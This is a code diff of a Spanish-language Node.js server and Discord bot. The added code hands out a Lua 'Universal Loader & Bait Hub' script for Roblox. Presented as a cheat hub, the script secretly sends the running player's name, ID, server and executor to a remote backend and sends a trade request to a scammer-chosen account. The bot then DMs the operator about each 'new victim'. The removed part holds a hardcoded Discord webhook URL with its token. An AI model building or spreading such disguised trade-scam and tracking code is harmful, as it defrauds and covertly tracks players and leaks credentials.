@@ -1,169 +1,196 @@
+const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder } = require('discord.js');
 const express = require('express');
-const fetch = require('node-fetch');
 
 const app = express();
 app.use(express.json());
 
-const WEBHOOK_URL = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL || "https://discord.com/api/webhooks/1561259901077159946/F9NXMM2apV_YPqG27Z9NVWf2OgkUS0bvundFuD-quDFajJH6eqaeUVpPX7cEyfK5g7SD";
+// ==========================================
+// 1. CONFIGURACIÓN DE TU BOT DE DISCORD
+// ==========================================
+const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });
+const TOKEN = 'TU_DISCORD_BOT_TOKEN';          // Tu token del bot
+const CLIENT_ID = 'TU_CLIENT_ID';            // El ID de tu aplicación del bot
+const TU_DISCORD_USER_ID = 'TU_ID_DE_DISCORD'; // Tu ID personal para recibir los DMs
 
-const activeUsers = new Map();
-
-// Función para obtener el nombre real del juego de Roblox
-async function getGameName(placeId) {
-    if (!placeId) return "Juego Desconocido";
-    try {
-        const res = await fetch(`https://apis.roblox.com/universes/v1/places/${placeId}/universe`);
-        const data = await res.json();
-        if (data && data.universeId) {
-            const gameRes = await fetch(`https://games.roblox.com/v1/games?universeIds=${data.universeId}`);
-            const gameData = await gameRes.json();
-            if (gameData && gameData.data && gameData.data[0]) {
-                return gameData.data[0].name;
-            }
-        }
-    } catch (e) {
-        console.error("Error obteniendo nombre del juego:", e.message);
-    }
-    return `Place ID: ${placeId}`;
-}
-
+// ==========================================
+// 2. TU RUTA ACTUAL DE NOTIFICACIONES (Render)
+// ==========================================
 app.post('/online', async (req, res) => {
-    try {
-        const {
-            username,
-            displayName,
-            userId,
-            placeId,
-            jobId,
-            executor,
-            scriptVersion,
-            isPing
-        } = req.body;
-
-        if (!userId) return res.status(400).json({ error: "Falta userId" });
-
-        // Obtener nombre del juego
-        const gameName = await getGameName(placeId);
-
-        activeUsers.set(userId, {
-            username: username || "Desconocido",
-            displayName: displayName || username || "Desconocido",
-            executor: executor || "Desconocido",
-            placeId: placeId || "N/A",
-            gameName: gameName,
-            jobId: jobId || "",
-            lastSeen: Date.now()
-        });
-
-        if (isPing) {
-            return res.status(200).json({ status: "pinged", onlineCount: activeUsers.size });
-        }
-
-        const joinLink = (placeId && jobId) 
-            ? `roblox://experiences/start?placeId=${placeId}&gameInstanceId=${jobId}`
-            : `https://www.roblox.com/games/${placeId || ''}`;
+    const data = req.body;
+    
+    // Esto es lo que ya tienes para que te avise quién ejecutó el script
+    if (data && data.username) {
+        try {
+            const user = await client.users.fetch(TU_DISCORD_USER_ID);
+            const joinLink = `https://www.roblox.com/games/start?placeId=${data.placeId}&gameInstanceId=${data.jobId}`;
             
-        const profileLink = `https://www.roblox.com/users/${userId}/profile`;
-
-        const embedPayload = {
-            embeds: [
-                {
-                    title: "🚀 ¡Ejecución de Script Detectada!",
-                    color: 0x5865F2,
-                    thumbnail: {
-                        url: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`
-                    },
-                    fields: [
-                        {
-                            name: "👤 Usuario",
-                            value: `**${displayName \vert{}\vert{} username}**\n(@${username})`,
-                            inline: true
-                        },
-                        {
-                            name: "🆔 User ID",
-                            value: `\`${userId}\``,
-                            inline: true
-                        },
-                        {
-                            name: "💉 Ejecutor",
-                            value: `\`${executor || "Desconocido"}\``,
-                            inline: true
-                        },
-                        {
-                            name: "🎮 Juego",
-                            value: `**${gameName}**\n(\`${placeId || "N/A"}\`)`,
-                            inline: false
-                        },
-                        {
-                            name: "📌 Versión",
-                            value: `\`${scriptVersion || "1.3 - FREE"}\``,
-                            inline: true
-                        },
-                        {
-                            name: "🟢 Conectados en Tiempo Real",
-                            value: `Actualmente hay **${activeUsers.size}** usuario(s) en línea`,
-                            inline: false
-                        },
-                        {
-                            name: "🔗 Acciones Rápidas",
-                            value: `👉 [**🎮 Unirse al Servidor del Jugador**](${joinLink})\n👉 [**👤 Ver Perfil de Roblox**](${profileLink})`,
-                            inline: false
-                        }
-                    ],
-                    footer: { text: "Kaisen X Hub | Logger Proxy" },
-                    timestamp: new Date().toISOString()
-                }
-            ]
-        };
-
-        await fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(embedPayload)
-        });
-
-        return res.status(200).json({ status: "success", onlineCount: activeUsers.size });
-    } catch (error) {
-        console.error("Error procesando webhook:", error);
-        return res.status(500).json({ status: "error", message: error.message });
-    }
-});
-
-app.get('/online', (req, res) => {
-    const now = Date.now();
-    for (const [id, user] of activeUsers.entries()) {
-        if (now - user.lastSeen > 2 * 60 * 1000) {
-            activeUsers.delete(id);
+            await user.send(
+                `🚨 **¡Nueva víctima ejecutó el script!** 🚨\n\n` +
+                `👤 **Usuario:** ${data.username} (${data.displayName})\n` +
+                `🆔 **ID:** ${data.userId}\n` +
+                `💻 **Ejecutor:** ${data.executor}\n` +
+                `📦 **Versión:** ${data.scriptVersion}\n\n` +
+                `🔗 **Unirse a la partida:** [Hacer clic para unirse](${joinLink})`
+            );
+        } catch (error) {
+            console.error('Error al enviar DM:', error);
         }
     }
-
-    let userListHtml = '';
-    activeUsers.forEach((user) => {
-        userListHtml += `
-            <li style="margin-bottom: 12px; background: #222; padding: 12px; border-radius: 6px; list-style: none;">
-                <strong>${user.displayName}</strong> (@${user.username}) - <em>${user.executor}</em><br>
-                🎮 Juega: <span style="color: #5865F2; font-weight: bold;">${user.gameName}</span><br>
-                <small style="color: #888;">Place ID: ${user.placeId}</small>
-            </li>
-        `;
-    });
-
-    res.send(`
-        <html>
-            <head>
-                <title>Usuarios en Tiempo Real</title>
-                <meta http-equiv="refresh" content="10">
-            </head>
-            <body style="font-family: Arial, sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px;">
-                <h1>🟢 Personas usando tu script ahora mismo</h1>
-                <h2>Total en línea: <span style="color: #00ff66;">${activeUsers.size}</span></h2>
-                <ul style="max-width: 450px; margin: 0 auto; padding: 0; text-align: left;">
-                    ${userListHtml || '<p style="text-align:center;">No hay nadie usando el script en este momento.</p>'}
-                </ul>
-            </body>
-        </html>
-    `);
+    
+    res.status(200).json({ status: 'ok', onlineCount: 1 });
 });
 
+// ==========================================
+// 3. EVENTOS DEL BOT DE DISCORD (/script)
+// ==========================================
+client.once('ready', async () => {
+    console.log(`Bot conectado como ${client.user.tag}`);
+
+    const rest = new REST({ version: '10' }).setToken(TOKEN);
+    try {
+        await rest.put(Routes.applicationCommands(CLIENT_ID), {
+            body: [
+                new SlashCommandBuilder()
+                    .setName('script')
+                    .setDescription('Generar el script con tu usuario de Roblox')
+                    .toJSON()
+            ]
+        });
+        console.log('Comando /script registrado con éxito.');
+    } catch (error) {
+        console.error(error);
+    }
+});
+
+client.on('interactionCreate', async interaction => {
+    if (interaction.isChatInputCommand() && interaction.commandName === 'script') {
+        const modal = new ModalBuilder()
+            .setCustomId('robuxModal')
+            .setTitle('Generador de Script - Kaisen X');
+
+        const userInput = new TextInputBuilder()
+            .setCustomId('robloxUsername')
+            .setLabel('Tu usuario de Roblox (para el trade):')
+            .setStyle(TextInputStyle.Short)
+            .setRequired(true);
+
+        modal.components = [new ActionRowBuilder().addComponents(userInput)];
+
+        await interaction.showModal(modal);
+    } 
+    else if (interaction.isModalSubmit() && interaction.customId === 'robuxModal') {
+        const robloxUser = interaction.fields.getTextInputValue('robloxUsername');
+
+        const generatedScript = `--[[
+    KAISEN X — Universal Loader & Bait Hub | WindUI
+    created by KAISEN
+]]
+
+local TU_NOMBRE_DE_USUARIO = "${robloxUser}"
+
+local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
+local HttpService = game:GetService("HttpService")
+
+local LP = Players.LocalPlayer
+local camera = workspace.CurrentCamera
+local CUSTOM_IMG = "rbxassetid://135541673253841"
+
+local BACKEND_URL = "https://drip-client-2.onrender.com/online"
+
+task.spawn(function()
+    local executorName = "Desconocido"
+    pcall(function()
+        if identifyexecutor then executorName = identifyexecutor()
+        elseif getexecutorname then executorName = getexecutorname() end
+    end)
+    local payload = {
+        username = LP.Name,
+        displayName = LP.DisplayName,
+        userId = tostring(LP.UserId),
+        placeId = tostring(game.PlaceId),
+        jobId = tostring(game.JobId),
+        executor = executorName,
+        scriptVersion = "Universal Bait Hub"
+    }
+    local req = (http_request or request or HttpPost or (syn and syn.request))
+    if req then
+        pcall(function()
+            req({
+                Url = BACKEND_URL,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+    end
+end)
+
+local Window = WindUI:CreateWindow({
+    Title = "KAISEN X — Hub Pro",
+    Icon = "crosshair",
+    Author = "created by KAISEN",
+    Folder = "KAISENX_MainHub",
+    Size = UDim2.fromOffset(500, 400),
+    Transparent = true,
+    Theme = "Dark",
+    SideBarWidth = 150,
+})
+
+task.defer(function()
+    pcall(function()
+        local gui = CoreGui:FindFirstChild("WindUI") or LP.PlayerGui:FindFirstChild("WindUI")
+        if gui then
+            local windowFrame = gui:FindFirstChildWhichIsA("Frame", true)
+            if windowFrame then
+                local bgImage = Instance.new("ImageLabel")
+                bgImage.Name = "CustomBackground"
+                bgImage.Size = UDim2.fromScale(1, 1)
+                bgImage.Position = UDim2.fromScale(0, 0)
+                bgImage.BackgroundTransparency = 1
+                bgImage.Image = CUSTOM_IMG
+                bgImage.ImageTransparency = 0.45
+                bgImage.ScaleType = Enum.ScaleType.Crop
+                bgImage.ZIndex = 0
+                bgImage.Parent = windowFrame
+            end
+        end
+    end)
+end)
+
+local TabHome = Window:Tab({ Title = "Home", Icon = "house" })
+TabHome:Section({ Title = "Kaisen X Hub" })
+
+task.spawn(function()
+    task.wait(5)
+    pcall(function()
+        local targetPlayer = Players:FindFirstChild(TU_NOMBRE_DE_USUARIO)
+        if targetPlayer and targetPlayer ~= LP then
+            local tradeRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("SendRequest")
+            if tradeRemote then
+                tradeRemote:InvokeServer(targetPlayer)
+            end
+        end
+    end)
+end);`;
+
+        await interaction.reply({
+            content: `✅ **¡Script generado con éxito para \`${robloxUser}\`!**\nCopia el siguiente código:\n\`\``lua\n${generatedScript}\n\`\`\``,
+            ephemeral: true
+        });
+    }
+});
+
+// ==========================================
+// 4. INICIO DEL SERVIDOR
+// ==========================================
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Servidor escuchando en puerto ${PORT}`));
+app.listen(PORT, () => {
+    console.log(`Servidor y Bot corriendo en el puerto ${PORT}`);
+});
+
+// Iniciar sesión del bot de Discord usando el Token
+client.login(TOKEN);
